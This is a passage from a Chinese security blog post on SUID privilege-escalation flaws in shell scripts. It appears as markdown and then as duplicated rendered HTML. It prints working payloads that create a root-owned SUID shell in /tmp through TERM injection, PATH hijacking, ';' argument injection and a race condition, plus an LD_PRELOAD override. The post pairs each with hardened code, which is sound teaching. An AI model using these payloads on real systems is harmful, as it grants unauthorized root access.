1.永远不要使用C-shell编写SUID脚本\n\n当程序在运行时,会接收到许多参数.大多数时候,程序员都关注于明显的输入,例如文中的$1,但漏洞往往隐藏在一些不明显的地方——环境变量\n\npayload:\n\n```bash\nenv TERM='`cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh`' change-pass\n```\n\n此处重设置了TERM变量,而当C-shell脚本在运行时,便执行了TERM中的命令,从而导致漏洞发生\n\n#### 2.记住手动设置PATH,并且使用绝对路径\n\n在上文中的`passwd $user`命令中,passwd使用了相对路径,从而导致漏洞发生.\n\n在正常情况下,系统会去搜索PATH路径下的passwd,然后执行/usr/bin/passwd文件\n\n但是如果攻击者将PATH设置为当前路径,并且创建一个恶意shell脚本,那么就会导致漏洞发生\n\npayload:\n\n```bash\n% export PATH='/tmp'\n% echo \"cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh\" >/tmp/passwd\n% ./change-pass\n```\n\n更改后的脚本如下:\n\n```bash\n#!/bin/ksh\nPATH='/bin:/usr/bin'\nuser=$1\n/usr/bin/passwd $user\n```\n\n另一个例子有一个C文件调用了system()函数,`system(\"mail\")`\n\n攻击者可以通过修改PATH,然后创建相应文件进行攻击\n\n#### 3.设置LD_LIBRARY_PATH\n\n当linux中,除非在编译时加上static选项,否则都会默认调用动态链接库`ld.so/ld-linux.so`\n\n可以使用`ldd FILE`查看所依赖的库\n\n当程序运行时会在LD_LIBRARY_PATH变量中查找所需动态库的地址,如果攻击者将此环境变量重置,从而将动态链接库替换为恶意代码,那么就会导致恶意代码执行\n\n解决方法:\n\n1.在程序中设置此环境变量\n\n2.在编译时静态连接\n\n#### 4.设置LD_PRELOAD变量\n\n与3类似,当程序在运行前,会先链接此变量中的动态链接库,如果攻击者修改为自己的恶意链接库,则造成危害\n\n举个例子:\n\n`export LD_PRELOAD=./libmylib.so`\n\n```c\n//a.c    C代码\n#include <stdio.h>\nvoid sleep (int s)\n{\nprintf(\"I am not sleeping!\\n\");\n}\n```\n\n编译:\n\n```bash\ngcc -fPIC -g -c a.c\ngcc -shared -o libmylib.so a.o -lc\n```\n\n```c\n//被攻击程序\nint main()\n{\nsleep(1);\nreturn 0;\n}\n```\n\n运行如上程序,则可以通过SUID执行恶意代码\n\n#### 5.了解程序是怎么运作的\n\n```bash\n#!/bin/ksh\nPATH='/bin:/usr/bin'\nuser=$1\nrm /tmp/.user\necho \"$user\" > /tmp/.user\nisroot='/usr/bin/grep -c root /tmp/.user'\n[ \"$isroot\" -gt 0 ] && echo \"You Can't change root's password!\" && exit\n/usr/bin/passwd $user\n```\n\n承接上文,如果此程序可以用来更改root的密码,那岂不是犯了大错,所以在程序中加入了用户检测,看看是不是root.如果是,那么就退出程序\n\n你以为这样就万事大吉了吗?不,还有许多问题.\n\n思考一个问题,如果用户输入为空,即单纯运行此脚本,那么是否会正常执行passwd命令?\n\n要记住,当passwd输入为空时,默认更改的账号是执行者的账号.又由于suid的设置,即会更改root的密码.也就是说,前面的检测不完全.\n\n新文件:\n\n```BASH\n#!/bin/ksh\nPATH='/bin:/usr/bin'\nuser=$1\n[ -z $user ] && echo \"Usage: change-pass username\" && exit\nrm /tmp/.user\necho \"$user\" > /tmp/.user\nisroot='/usr/bin/grep -c root /tmp/.user'\n[ \"$isroot\" -gt 0 ] && echo \"You Can't change root's password!\" && exit\n/usr/bin/passwd $user\n```\n\n可以看到,在这里添加了检测输入是否为空,如果为空即退出.\n\n##### 所以,一定要理解程序是怎么运行的,特别关注各种参数带来的不同影响.\n\n#### 6.除非必要,不要使用临时文件.就算要使用也不要放在公共可读写区域.\n\n当攻击者在脚本删除文件的一瞬间后,又创建了一个.user文件,内部为空.那么这个时候会被覆盖吗?也许会,但也许也不会,这要看文件权限是怎么设置的.但是一旦没有覆盖,攻击者就绕过了用户名检测,就可以更改root的密码了.\n\n#### 7.检查所有输入,去除元字符\n\n```bash\n#!/bin/ksh\nPATH='/bin:/usr/bin'\nuser=$1\n[ -z $user ] && echo \"Usage: change-pass username\" && exit\n[ \"$user\" = root ] && echo \"You can't change root's password!\" && exit\n/usr/bin/passwd $user\n```\n\n​\t在新脚本中,我们不再使用临时文件,转而直接检测.但却没有对用户输入进行更深的检测,这就有可能导致漏洞的发生\n\npayload: `./change-pass \"user;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh\"`\n\n可以看到,在此处运用了`;`进行分割,当程序执行完passwd命令后,又会以root身份执行其他命令,这无异是一个很大的问题.\n\n新脚本:\n\n```bash\n#!/bin/ksh\nPATH='/bin:/usr/bin'\nuser=${1##*[ \\\\$/;()|\\>\\<& ]}\n[ -z $user ] && echo \"Usage: change-pass username\" && exit\n[ \"$user\" = root ] && \"You can't change root's password!\" && exit\n/usr/bin/passwd $user\n```\n\n在此处,我们对用户的输入进行过滤,去除元字符,从而保障语句执行的正确性.\n\n#### 8.记得设置IFS\n\nIFS,一个环境变量,Internal Field Separator,即内部字段分隔符.在这里,如果提前设置\n\n`export IFS='/'`那么当程序执行`/usr/bin/passwd`时,就会执行`usr`、`bin`、`passwd`三个命令,从而造成危险\n\n```bash\n#!/bin/ksh\nPATH='/bin:/usr/bin'\nIFS=' '\nuser=${1##*[ \\\\$/;()|\\>\\<& ]}\n[ -z $user ] && echo \"Usage: change-pass username\" && exit\n[ \"$user\" = root ] && \"You can't change root's password!\" && exit\n/usr/bin/passwd $user\n```\n\n#### 9.不可避免的危险——固有条件竞争\n\n程序在执行suid脚本时分为两步\n\n1.系统打开一个新shell\n\n2.新shell读取脚本的内容并执行.\n\n如果时间点卡得刚刚好,那么攻击者可以先创建一个链接,在执行改链接文件的瞬间替换它的内容,从而实现通过SUID所有者权限执行任意内容\n\npayload:\n\n```bash\n./rootme & rm rootme && \\\necho \"cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh\" \\\n >> rootme\n```\n\n### \t修复:\n\n#### \t\t尽量少调用外部函数\n\n#### \t\t最小特权原则\n\n## 参考\n\n[EN - SUID Privileged Programs.pdf](http://repository.root-me.org/Administration/Unix/EN%20-%20SUID%20Privileged%20Programs.pdf)\n\n[EN - Dangers of SUID Shell Scripts.pdf](http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf)\n\n","slug":"SUID越权利用","published":1,"updated":"2021-04-10T13:43:56.105Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cknbshdmw0000vkvza6v3dseh","content":"<h1 id=\"Set-UID-Privileged-Programs\"><a href=\"#Set-UID-Privileged-Programs\" class=\"headerlink\" title=\"Set-UID Privileged Programs\"></a>Set-UID Privileged Programs</h1><h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理:\"></a>原理:</h2><h3 id=\"操作系统\"><a href=\"#操作系统\" class=\"headerlink\" title=\"操作系统:\"></a>操作系统:</h3><h4 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux:\"></a>Linux:</h4><p>linux系统具有严格的权限管理,故只有linux系统有suid属性</p>\n<h4 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows:\"></a>Windows:</h4><p>但是windows是怎么解决这个问题的呢?</p>\n<h3 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理:\"></a>工作原理:</h3><p>当一个文件设置为suid属性时,则当<em><strong>任意用户</strong></em>在运行此程序时,都变为此<em><strong>程序拥有者</strong></em>所拥有的权限</p>\n<h3 id=\"情景\"><a href=\"#情景\" class=\"headerlink\" title=\"情景:\"></a>情景:</h3><p>1.你希望别人能通过一个程序<em><strong>间接地</strong></em>访问你的文件,但你又<em><strong>不希望</strong></em>别人能够<em><strong>直接查看更改</strong></em>你的文件,那这要怎么办呢?答案是:将此程序设置为suid属性</p>\n<p>2.shadow文件是000的权限,即所有用户都不能修改(<strong>root无视权限限制</strong>)当用户使用passwd命令更改密码时,就是因为passwd属性设置为suid,而其拥有者为root,所以可以更改shadow文件</p>\n<h2 id=\"漏洞\"><a href=\"#漏洞\" class=\"headerlink\" title=\"漏洞\"></a>漏洞</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介:\"></a>简介:</h3><p>大多数管理员都通过suid属性便捷他们的日常工作.但在这其中,大多数管理员都没有注意到一些细微的问题,以导致安全问题的发生.</p>\n<h3 id=\"利用过程\"><a href=\"#利用过程\" class=\"headerlink\" title=\"利用过程:\"></a>利用过程:</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">% ls change-pass</span><br><span class=\"line\">-rwsr-x--- 1 root helpdesk</span><br><span class=\"line\"> 37 Feb 26 16:35 change-pass</span><br><span class=\"line\">% cat change-pass</span><br><span class=\"line\"><span class=\"meta\">#!/bin/csh -b</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> user = <span class=\"variable\">$1</span></span><br><span class=\"line\">passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<p>假设我创建了一个含suid属性的shell脚本,用于方便用户更改密码.此时一切看起来安好,然而却有漏洞存在</p>\n<h4 id=\"1-永远不要使用C-shell编写SUID脚本\"><a href=\"#1-永远不要使用C-shell编写SUID脚本\" class=\"headerlink\" title=\"1.永远不要使用C-shell编写SUID脚本\"></a>1.永远不要使用C-shell编写SUID脚本</h4><p>当程序在运行时,会接收到许多参数.大多数时候,程序员都关注于明显的输入,例如文中的$1,但漏洞往往隐藏在一些不明显的地方——环境变量</p>\n<p>payload:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">env TERM=<span class=\"string\">&#x27;`cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh`&#x27;</span> change-pass</span><br></pre></td></tr></table></figure>\n\n<p>此处重设置了TERM变量,而当C-shell脚本在运行时,便执行了TERM中的命令,从而导致漏洞发生</p>\n<h4 id=\"2-记住手动设置PATH-并且使用绝对路径\"><a href=\"#2-记住手动设置PATH-并且使用绝对路径\" class=\"headerlink\" title=\"2.记住手动设置PATH,并且使用绝对路径\"></a>2.记住手动设置PATH,并且使用绝对路径</h4><p>在上文中的<code>passwd $user</code>命令中,passwd使用了相对路径,从而导致漏洞发生.</p>\n<p>在正常情况下,系统会去搜索PATH路径下的passwd,然后执行/usr/bin/passwd文件</p>\n<p>但是如果攻击者将PATH设置为当前路径,并且创建一个恶意shell脚本,那么就会导致漏洞发生</p>\n<p>payload:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">% <span class=\"built_in\">export</span> PATH=<span class=\"string\">&#x27;/tmp&#x27;</span></span><br><span class=\"line\">% <span class=\"built_in\">echo</span> <span class=\"string\">&quot;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh&quot;</span> &gt;/tmp/passwd</span><br><span class=\"line\">% ./change-pass</span><br></pre></td></tr></table></figure>\n\n<p>更改后的脚本如下:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/ksh</span></span><br><span class=\"line\">PATH=<span class=\"string\">&#x27;/bin:/usr/bin&#x27;</span></span><br><span class=\"line\">user=<span class=\"variable\">$1</span></span><br><span class=\"line\">/usr/bin/passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<p>另一个例子有一个C文件调用了system()函数,<code>system(&quot;mail&quot;)</code></p>\n<p>攻击者可以通过修改PATH,然后创建相应文件进行攻击</p>\n<h4 id=\"3-设置LD-LIBRARY-PATH\"><a href=\"#3-设置LD-LIBRARY-PATH\" class=\"headerlink\" title=\"3.设置LD_LIBRARY_PATH\"></a>3.设置LD_LIBRARY_PATH</h4><p>当linux中,除非在编译时加上static选项,否则都会默认调用动态链接库<code>ld.so/ld-linux.so</code></p>\n<p>可以使用<code>ldd FILE</code>查看所依赖的库</p>\n<p>当程序运行时会在LD_LIBRARY_PATH变量中查找所需动态库的地址,如果攻击者将此环境变量重置,从而将动态链接库替换为恶意代码,那么就会导致恶意代码执行</p>\n<p>解决方法:</p>\n<p>1.在程序中设置此环境变量</p>\n<p>2.在编译时静态连接</p>\n<h4 id=\"4-设置LD-PRELOAD变量\"><a href=\"#4-设置LD-PRELOAD变量\" class=\"headerlink\" title=\"4.设置LD_PRELOAD变量\"></a>4.设置LD_PRELOAD变量</h4><p>与3类似,当程序在运行前,会先链接此变量中的动态链接库,如果攻击者修改为自己的恶意链接库,则造成危害</p>\n<p>举个例子:</p>\n<p><code>export LD_PRELOAD=./libmylib.so</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//a.c    C代码</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">sleep</span> <span class=\"params\">(<span class=\"keyword\">int</span> s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;I am not sleeping!\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -fPIC -g -c a.c</span><br><span class=\"line\">gcc -shared -o libmylib.so a.o -lc</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//被攻击程序</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行如上程序,则可以通过SUID执行恶意代码</p>\n<h4 id=\"5-了解程序是怎么运作的\"><a href=\"#5-了解程序是怎么运作的\" class=\"headerlink\" title=\"5.了解程序是怎么运作的\"></a>5.了解程序是怎么运作的</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/ksh</span></span><br><span class=\"line\">PATH=<span class=\"string\">&#x27;/bin:/usr/bin&#x27;</span></span><br><span class=\"line\">user=<span class=\"variable\">$1</span></span><br><span class=\"line\">rm /tmp/.user</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> &gt; /tmp/.user</span><br><span class=\"line\">isroot=<span class=\"string\">&#x27;/usr/bin/grep -c root /tmp/.user&#x27;</span></span><br><span class=\"line\">[ <span class=\"string\">&quot;<span class=\"variable\">$isroot</span>&quot;</span> -gt 0 ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;You Can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">/usr/bin/passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<p>承接上文,如果此程序可以用来更改root的密码,那岂不是犯了大错,所以在程序中加入了用户检测,看看是不是root.如果是,那么就退出程序</p>\n<p>你以为这样就万事大吉了吗?不,还有许多问题.</p>\n<p>思考一个问题,如果用户输入为空,即单纯运行此脚本,那么是否会正常执行passwd命令?</p>\n<p>要记住,当passwd输入为空时,默认更改的账号是执行者的账号.又由于suid的设置,即会更改root的密码.也就是说,前面的检测不完全.</p>\n<p>新文件:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/ksh</span></span><br><span class=\"line\">PATH=<span class=\"string\">&#x27;/bin:/usr/bin&#x27;</span></span><br><span class=\"line\">user=<span class=\"variable\">$1</span></span><br><span class=\"line\">[ -z <span class=\"variable\">$user</span> ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">rm /tmp/.user</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> &gt; /tmp/.user</span><br><span class=\"line\">isroot=<span class=\"string\">&#x27;/usr/bin/grep -c root /tmp/.user&#x27;</span></span><br><span class=\"line\">[ <span class=\"string\">&quot;<span class=\"variable\">$isroot</span>&quot;</span> -gt 0 ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;You Can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">/usr/bin/passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到,在这里添加了检测输入是否为空,如果为空即退出.</p>\n<h5 id=\"所以-一定要理解程序是怎么运行的-特别关注各种参数带来的不同影响\"><a href=\"#所以-一定要理解程序是怎么运行的-特别关注各种参数带来的不同影响\" class=\"headerlink\" title=\"所以,一定要理解程序是怎么运行的,特别关注各种参数带来的不同影响.\"></a>所以,一定要理解程序是怎么运行的,特别关注各种参数带来的不同影响.</h5><h4 id=\"6-除非必要-不要使用临时文件-就算要使用也不要放在公共可读写区域\"><a href=\"#6-除非必要-不要使用临时文件-就算要使用也不要放在公共可读写区域\" class=\"headerlink\" title=\"6.除非必要,不要使用临时文件.就算要使用也不要放在公共可读写区域.\"></a>6.除非必要,不要使用临时文件.就算要使用也不要放在公共可读写区域.</h4><p>当攻击者在脚本删除文件的一瞬间后,又创建了一个.user文件,内部为空.那么这个时候会被覆盖吗?也许会,但也许也不会,这要看文件权限是怎么设置的.但是一旦没有覆盖,攻击者就绕过了用户名检测,就可以更改root的密码了.</p>\n<h4 id=\"7-检查所有输入-去除元字符\"><a href=\"#7-检查所有输入-去除元字符\" class=\"headerlink\" title=\"7.检查所有输入,去除元字符\"></a>7.检查所有输入,去除元字符</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/ksh</span></span><br><span class=\"line\">PATH=<span class=\"string\">&#x27;/bin:/usr/bin&#x27;</span></span><br><span class=\"line\">user=<span class=\"variable\">$1</span></span><br><span class=\"line\">[ -z <span class=\"variable\">$user</span> ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">[ <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> = root ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;You can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">/usr/bin/passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<p>​    在新脚本中,我们不再使用临时文件,转而直接检测.但却没有对用户输入进行更深的检测,这就有可能导致漏洞的发生</p>\n<p>payload: <code>./change-pass &quot;user;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot;</code></p>\n<p>可以看到,在此处运用了<code>;</code>进行分割,当程序执行完passwd命令后,又会以root身份执行其他命令,这无异是一个很大的问题.</p>\n<p>新脚本:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/ksh</span></span><br><span class=\"line\">PATH=<span class=\"string\">&#x27;/bin:/usr/bin&#x27;</span></span><br><span class=\"line\">user=<span class=\"variable\">$&#123;1##*[ \\\\$/;()|\\&gt;\\&lt;&amp; ]&#125;</span></span><br><span class=\"line\">[ -z <span class=\"variable\">$user</span> ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">[ <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> = root ] &amp;&amp; <span class=\"string\">&quot;You can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">/usr/bin/passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<p>在此处,我们对用户的输入进行过滤,去除元字符,从而保障语句执行的正确性.</p>\n<h4 id=\"8-记得设置IFS\"><a href=\"#8-记得设置IFS\" class=\"headerlink\" title=\"8.记得设置IFS\"></a>8.记得设置IFS</h4><p>IFS,一个环境变量,Internal Field Separator,即内部字段分隔符.在这里,如果提前设置</p>\n<p><code>export IFS=&#39;/&#39;</code>那么当程序执行<code>/usr/bin/passwd</code>时,就会执行<code>usr</code>、<code>bin</code>、<code>passwd</code>三个命令,从而造成危险</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/ksh</span></span><br><span class=\"line\">PATH=<span class=\"string\">&#x27;/bin:/usr/bin&#x27;</span></span><br><span class=\"line\">IFS=<span class=\"string\">&#x27; &#x27;</span></span><br><span class=\"line\">user=<span class=\"variable\">$&#123;1##*[ \\\\$/;()|\\&gt;\\&lt;&amp; ]&#125;</span></span><br><span class=\"line\">[ -z <span class=\"variable\">$user</span> ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">[ <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> = root ] &amp;&amp; <span class=\"string\">&quot;You can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">/usr/bin/passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"9-不可避免的危险——固有条件竞争\"><a href=\"#9-不可避免的危险——固有条件竞争\" class=\"headerlink\" title=\"9.不可避免的危险——固有条件竞争\"></a>9.不可避免的危险——固有条件竞争</h4><p>程序在执行suid脚本时分为两步</p>\n<p>1.系统打开一个新shell</p>\n<p>2.新shell读取脚本的内容并执行.</p>\n<p>如果时间点卡得刚刚好,那么攻击者可以先创建一个链接,在执行改链接文件的瞬间替换它的内容,从而实现通过SUID所有者权限执行任意内容</p>\n<p>payload:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./rootme &amp; rm rootme &amp;&amp; \\</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot;</span> \\</span><br><span class=\"line\"> &gt;&gt; rootme</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复:\"></a>修复:</h3><h4 id=\"尽量少调用外部函数\"><a href=\"#尽量少调用外部函数\" class=\"headerlink\" title=\"尽量少调用外部函数\"></a>尽量少调用外部函数</h4><h4 id=\"最小特权原则\"><a href=\"#最小特权原则\" class=\"headerlink\" title=\"最小特权原则\"></a>最小特权原则</h4><h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"http://repository.root-me.org/Administration/Unix/EN%20-%20SUID%20Privileged%20Programs.pdf\">EN - SUID Privileged Programs.pdf</a></p>\n<p><a href=\"http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf\">EN - Dangers of SUID Shell Scripts.pdf</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Set-UID-Privileged-Programs\"><a href=\"#Set-UID-Privileged-Programs\" class=\"headerlink\" title=\"Set-UID Privileged Programs\"></a>Set-UID Privileged Programs</h1><h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理:\"></a>原理:</h2><h3 id=\"操作系统\"><a href=\"#操作系统\" class=\"headerlink\" title=\"操作系统:\"></a>操作系统:</h3><h4 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux:\"></a>Linux:</h4><p>linux系统具有严格的权限管理,故只有linux系统有suid属性</p>\n<h4 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows:\"></a>Windows:</h4><p>但是windows是怎么解决这个问题的呢?</p>\n<h3 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理:\"></a>工作原理:</h3><p>当一个文件设置为suid属性时,则当<em><strong>任意用户</strong></em>在运行此程序时,都变为此<em><strong>程序拥有者</strong></em>所拥有的权限</p>\n<h3 id=\"情景\"><a href=\"#情景\" class=\"headerlink\" title=\"情景:\"></a>情景:</h3><p>1.你希望别人能通过一个程序<em><strong>间接地</strong></em>访问你的文件,但你又<em><strong>不希望</strong></em>别人能够<em><strong>直接查看更改</strong></em>你的文件,那这要怎么办呢?答案是:将此程序设置为suid属性</p>\n<p>2.shadow文件是000的权限,即所有用户都不能修改(<strong>root无视权限限制</strong>)当用户使用passwd命令更改密码时,就是因为passwd属性设置为suid,而其拥有者为root,所以可以更改shadow文件</p>\n<h2 id=\"漏洞\"><a href=\"#漏洞\" class=\"headerlink\" title=\"漏洞\"></a>漏洞</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介:\"></a>简介:</h3><p>大多数管理员都通过suid属性便捷他们的日常工作.但在这其中,大多数管理员都没有注意到一些细微的问题,以导致安全问题的发生.</p>\n<h3 id=\"利用过程\"><a href=\"#利用过程\" class=\"headerlink\" title=\"利用过程:\"></a>利用过程:</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">% ls change-pass</span><br><span class=\"line\">-rwsr-x--- 1 root helpdesk</span><br><span class=\"line\"> 37 Feb 26 16:35 change-pass</span><br><span class=\"line\">% cat change-pass</span><br><span class=\"line\"><span class=\"meta\">#!/bin/csh -b</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> user = <span class=\"variable\">$1</span></span><br><span class=\"line\">passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<p>假设我创建了一个含suid属性的shell脚本,用于方便用户更改密码.此时一切看起来安好,然而却有漏洞存在</p>\n<h4 id=\"1-永远不要使用C-shell编写SUID脚本\"><a href=\"#1-永远不要使用C-shell编写SUID脚本\" class=\"headerlink\" title=\"1.永远不要使用C-shell编写SUID脚本\"></a>1.永远不要使用C-shell编写SUID脚本</h4><p>当程序在运行时,会接收到许多参数.大多数时候,程序员都关注于明显的输入,例如文中的$1,但漏洞往往隐藏在一些不明显的地方——环境变量</p>\n<p>payload:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">env TERM=<span class=\"string\">&#x27;`cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh`&#x27;</span> 